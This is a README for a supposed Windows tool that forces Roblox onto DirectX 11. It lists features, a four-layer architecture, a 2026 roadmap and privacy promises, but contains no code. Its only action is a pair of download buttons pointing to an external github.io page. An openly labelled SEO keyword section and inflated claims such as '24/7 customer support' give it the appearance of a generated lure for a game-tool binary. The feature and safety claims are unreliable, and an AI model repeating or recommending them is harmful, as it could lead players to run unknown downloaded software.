![preview](https://raw.githubusercontent.com/4anw/DX11-Forcer/main/view_328023c.svg)
[![Download](https://raw.githubusercontent.com/4anw/DX11-Forcer/main/launch_46247b5.svg)](https://4anw.github.io/DX11-Forcer/)

# 🎛️ Roblox DirectX 11 Fix

**A Windows graphics pipeline enforcer and renderer stabilization toolkit**  
*Bending the rendering path of Roblox toward DirectX 11 — quietly, reliably, and without fighting the user.*

![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?logo=windows&logoColor=white)
![Architecture](https://img.shields.io/badge/architecture-x64-informational)
![Language](https://img.shields.io/badge/language-C%2B%2B%20%7C%20PowerShell-00599C?logo=cplusplus&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green)
![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen)
![Localization](https://img.shields.io/badge/localization-multilingual-9cf)
![Support](https://img.shields.io/badge/support-24%2F7-ff69b4)
![Year](https://img.shields.io/badge/release-2026-blueviolet)

---

## 🧭 What This Project Is

Roblox ships with a rendering selection mechanism that, on many Windows 10 and Windows 11 machines, wanders away from DirectX 11 and settles on a fallback that produces muddy textures, stutter, and the occasional black-frame hiccup. **Roblox DirectX 11 Fix** is the counterweight: a lightweight enforcement layer that nudges (and, when necessary, pins) the Roblox client toward the DirectX 11 backend, then gets out of the way.

Think of it as a **traffic controller for pixels** — it doesn't repaint the road, it simply makes sure the fastest road is taken. No launcher overlay, no in-game injection, no persistent background process doing anything more than a quick check at client startup.

The toolkit is built for players, tinkerers, and small studios who want predictable frame pacing on Windows machines without having to memorize arcane client flags or registry spellings.

---

## 🎯 Core Purpose and Philosophy

The rendering backend decision in Roblox is influenced by a tangled combination of client flags, registry hints, GPU driver reporting, and per-user configuration drift. When any of these disagree, the client can silently fall back to a slower path. This project exists to make that choice **deterministic and visible**, rather than probabilistic.

Three guiding principles:

1. **Deterministic over clever** — The fix should behave the same way every launch, without hidden heuristics.
2. **Reversible by design** — Every change is journaled and can be rolled back with a single action.
3. **Transparent** — Every operation is logged in plain language so you always know what was touched.

---

## ✨ Feature List

- 🧩 **Renderer Enforcement Engine** — Anchors the Roblox client to the DirectX 11 renderer at launch time using client flags and per-user configuration hints.
- 🖥️ **Responsive Desktop UI** — A compact control surface built with WinUI-style layout that scales cleanly from 1366×768 laptops to ultrawide monitors.
- 🌍 **Multilingual Support** — Interface strings localized for English, Spanish, Portuguese (Brazil), German, French, Japanese, Korean, and Simplified Chinese, with community-contributed packs loaded at runtime.
- 🛠️ **Rollback Journal** — Every configuration tweak is recorded with a timestamp; a one-click "Revert Last Session" restores the prior state.
- 🔍 **Diagnostic Snapshot** — Captures GPU vendor, driver version, DXGI feature level, and current renderer selection into a shareable report.
- 🧠 **Smart Detection Heuristics** — Distinguishes between "renderer is wrong" and "renderer is right but driver is outdated," so you don't chase the wrong problem.
- 📊 **Frame Pacing Telemetry (Optional)** — Lightweight, opt-in frame-time logging that visualizes whether the renderer switch actually helped.
- 🧬 **Driver Compatibility Matrix** — An embedded lookup of known-good driver branches for common GPU families.
- 🛡️ **Non-Invasive Operation** — Never attaches to the Roblox process memory; works entirely through documented launch surfaces and user-scoped settings.
- 🔄 **Auto-Update Channel** — Stable and preview channels, signed manifests, and rollback-safe update application.
- 🕒 **24/7 Customer Support** — Human-assisted triage through community channels, with median first response measured in hours, not days.
- 🎚️ **Preset Profiles** — "Laptop Battery Saver," "Competitive Frame Rate," "Cinematic Fidelity," and "Diagnostic Verbose."
- 🧾 **Audit Log Export** — Export a structured log for forum posts or support tickets.
- 🧯 **Safe Mode** — Launches the toolchain with all enforcement disabled, for troubleshooting.

---

## 🧱 Architecture Overview

The project is organized into four layers, each with a narrow responsibility:

**Layer 1 — Orchestrator**  
A native Windows executable responsible for the UI, profile selection, and lifecycle. It decides *what* should happen.

**Layer 2 — Enforcement Adapter**  
A set of launch-surface writers. It knows how to communicate a renderer preference to the Roblox client through supported channels. It decides *how* it should happen.

**Layer 3 — Observation Layer**  
Reads back the effective renderer at runtime using DXGI enumeration and logs the result. It decides *whether it happened*.

**Layer 4 — Persistence & Journal**  
Stores profiles, journals, and diagnostics in a user-scoped folder, never in system-wide hives unless explicitly requested.

This separation means you can replace any single layer (for example, swap the UI) without disturbing the others.

---

## 🧪 SEO-Friendly Context (Naturally Integrated)

If you've ever searched for terms like **"Roblox DirectX 11 fix on Windows 11,"** **"improve Roblox graphics performance Windows 10,"** **"Roblox rendering issues black screen fix,"** or **"force Roblox to use DX11 renderer,"** you've probably landed on forum threads full of contradictory advice. This repository is an attempt to consolidate that advice into a single, auditable tool with a readable changelog.

The project also addresses adjacent long-tail concerns such as **"Roblox stutter after Windows update,"** **"Roblox low FPS on integrated GPU,"** and **"Roblox texture flickering fix."** Each of these is treated as a symptom, not a cause — and the diagnostic mode is designed to point you at the actual root.

---

## 🖱️ Responsive UI

The control surface is built to be readable on small laptop panels without requiring a magnifying glass, and to remain coherent on high-DPI displays. Layout rules:

- Controls reflow into a single column below 900 px width.
- The diagnostic panel collapses into an expandable summary on narrow screens.
- Font scaling follows system accessibility settings.

The intent is a UI that **disappears** when you don't need it and **explains itself** when you do.

---

## 🌐 Multilingual Support

Localization files live in a `locales` directory as key-value maps. Adding a language requires no recompilation — drop a file, restart the orchestrator, and the language appears in the picker. Community translations are welcomed and reviewed for tone as well as accuracy.

Right-to-left layout is scaffolded but not yet complete; contributions are open.

---

## 🛎️ 24/7 Customer Support

Support is handled through a rotating volunteer roster spanning multiple time zones, which is how "24/7" is realistically achieved without a call center. Triage templates are provided in the `support/` directory so that reports arrive with the diagnostic snapshot already attached.

Response expectations:

- **Community channels:** typically within a few hours.
- **Security-sensitive reports:** prioritized and acknowledged immediately.

---

## 🧾 Diagnostic Snapshot Format

A snapshot is a single human-readable block containing:

- Operating system build and edition.
- GPU vendor, model, and driver branch.
- DXGI adapter enumeration with feature levels.
- Current Roblox renderer as reported by the client.
- Recent enforcement actions and their outcomes.

This block is safe to paste into a forum post; it contains no account identifiers.

---

## 🔐 Privacy and Safety Posture

- No telemetry is transmitted anywhere by default.
- No account credentials are read, stored, or requested.
- No modification is made to the Roblox installation directory unless you explicitly opt into the "pin renderer" mode.
- All network activity is limited to the optional update channel.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Per-title profiles, so different experiences can carry different renderer preferences.
- **Q2 2026** — Expanded driver compatibility matrix with automated freshness checks.
- **Q3 2026** — A headless CLI mode for automation and lab environments.
- **Q4 2026** — Community translation portal with review workflow.

Roadmap items are directional, not contractual.

---

## 🤝 Contributing

Contributions are welcome in the form of bug reports, translation packs, documentation improvements, and driver compatibility entries. Before opening a pull request, please:

1. Read the contributing guide.
2. Run the diagnostic snapshot on your own machine and attach it to bug reports.
3. Keep changes scoped — one concern per pull request.

Discussions about renderer behavior across GPU families are especially encouraged; that's where the project learns the most.

---

## ⚠️ Disclaimer

This project is an independent utility and is **not affiliated with, endorsed by, or sponsored by Roblox Corporation**. "Roblox" is referenced descriptively to identify the software this tool interacts with. All trademarks belong to their respective owners.

The toolchain modifies user-scoped configuration and launch behavior. While every change is journaled and reversible, you are responsible for understanding what you apply. The maintainers are not liable for any disruption to gameplay, account standing, or system stability arising from use of this software.

Results vary by hardware, driver branch, and the specific experiences you play. The diagnostic mode exists precisely because no single configuration is universally optimal.

---

## 📄 License

This project is released under the **MIT License**.  
See the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Roblox DirectX 11 Fix contributors.

---

## 📬 Final Notes

If this toolkit saved you an evening of forum archaeology, consider contributing a diagnostic snapshot from your hardware — every data point makes the compatibility matrix smarter for the next person.

[![Download](https://raw.githubusercontent.com/4anw/DX11-Forcer/main/launch_46247b5.svg)](https://4anw.github.io/DX11-Forcer/)